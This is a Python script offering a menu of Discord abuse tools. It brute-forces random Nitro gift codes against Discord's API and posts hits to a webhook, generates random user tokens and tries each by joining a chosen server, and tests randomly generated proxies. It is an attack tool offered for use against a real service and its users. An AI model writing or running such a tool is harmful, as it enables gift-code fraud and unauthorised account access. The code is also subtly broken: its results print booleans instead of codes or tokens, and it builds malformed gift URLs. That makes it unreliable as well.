import asyncio
import aiohttp
import random
import string
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel

console = Console()

# Generate a random Discord User Token
def generate_user_token():
    token = ''.join(random.choices(string.ascii_letters + string.digits, k=24)) + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=27))
    return token

# Generate a random Nitro Code
def generate_nitro_code():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f"https://discord.com/gifts/{code}"

# Generate a random Proxy
def generate_proxy():
    ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
    port = random.randint(1000, 9999)
    return f"{ip}:{port}"

# Check the validity of a Nitro Code
async def check_nitro(session, code):
    url = f"https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
    async with session.get(url) as response:
        if response.status == 200:
            return True
        return False

# Check if a Proxy is valid
async def check_proxy(proxy):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://httpbin.org/ip', proxy=f"http://{proxy}", timeout=3) as response:
                if response.status == 200:
                    return True
    except:
        return False

# Check if a User Token is valid by attempting to join a server
async def check_token(token, server_id):
    url = f"https://discord.com/api/v9/guilds/{server_id}/members/@me"
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    async with aiohttp.ClientSession() as session:
        async with session.put(url, headers=headers) as response:
            if response.status == 201:  # 201 = successfully joined
                return True
            return False

# Main Generator and Checker for Proxies
async def proxy_gen_and_check():
    proxy_count = int(Prompt.ask("[bold blue]How many proxies to generate?[/]"))
    valids = 0
    invalids = 0

    tasks = []
    for _ in range(proxy_count):
        proxy = generate_proxy()
        tasks.append(asyncio.ensure_future(check_proxy(proxy)))

    results = await asyncio.gather(*tasks)

    for result, proxy in zip(results, tasks):
        if result:
            valids += 1
            console.print(f"[green]Valid Proxy: {proxy.result()}")
        else:
            invalids += 1
            console.print(f"[red]Invalid Proxy: {proxy.result()}")

    console.print(f"[cyan]Proxy Generation Completed! Valid: {valids}, Invalid: {invalids}")

# Main Generator and Checker for Nitro Codes
async def nitro_gen_and_check():
    nitro_count = int(Prompt.ask("[bold blue]How many Nitro codes to generate?[/]"))
    webhook_url = Prompt.ask("[bold blue]Enter your Discord Webhook URL to send valid codes:[/]")
    valids = 0

    tasks = []
    async with aiohttp.ClientSession() as session:
        for _ in range(nitro_count):
            code = generate_nitro_code()
            tasks.append(asyncio.ensure_future(check_nitro(session, code)))

        results = await asyncio.gather(*tasks)

        for result, code in zip(results, tasks):
            if result:
                valids += 1
                console.print(f"[green]Valid Nitro Code: {code.result()}")
                # Send valid code to webhook
                await session.post(webhook_url, json={"content": f"Valid Nitro Code: {code.result()}"})
            else:
                console.print(f"[red]Invalid Nitro Code: {code.result()}")

    console.print(f"[cyan]Nitro Generation Completed! Valid Codes: {valids}")

# Main Generator and Checker for User Tokens
async def user_token_gen_and_check():
    token_count = int(Prompt.ask("[bold blue]How many User Tokens to generate?[/]"))
    server_id = Prompt.ask("[bold blue]Enter Server ID for Token Join Test:[/]")
    valids = 0
    invalids = 0

    tasks = []
    for _ in range(token_count):
        token = generate_user_token()
        tasks.append(asyncio.ensure_future(check_token(token, server_id)))

    results = await asyncio.gather(*tasks)

    for result, token in zip(results, tasks):
        if result:
            valids += 1
            console.print(f"[green]Valid Token Joined Server: {token.result()}")
        else:
            invalids += 1
            console.print(f"[red]Invalid Token: {token.result()}")

    console.print(f"[cyan]User Token Generation Completed! Valid: {valids}, Invalid: {invalids}")

# Main Menu
def main_menu():
    console.print(Panel.fit("Main Menu", style="bold green"))

    options = ["[1] Nitro Generator + Checker", "[2] User Token Generator + Joiner", "[3] Proxy Generator + Checker"]
    for option in options:
        console.print(option)

    choice = Prompt.ask("[bold blue]Choose an option (1-3):[/]")

    if choice == "1":
        asyncio.run(nitro_gen_and_check())
    elif choice == "2":
        asyncio.run(user_token_gen_and_check())
    elif choice == "3":
        asyncio.run(proxy_gen_and_check())
    else:
        console.print("[red]Invalid choice, please try again.[/]")

if __name__ == "__main__":
    main_menu()
m
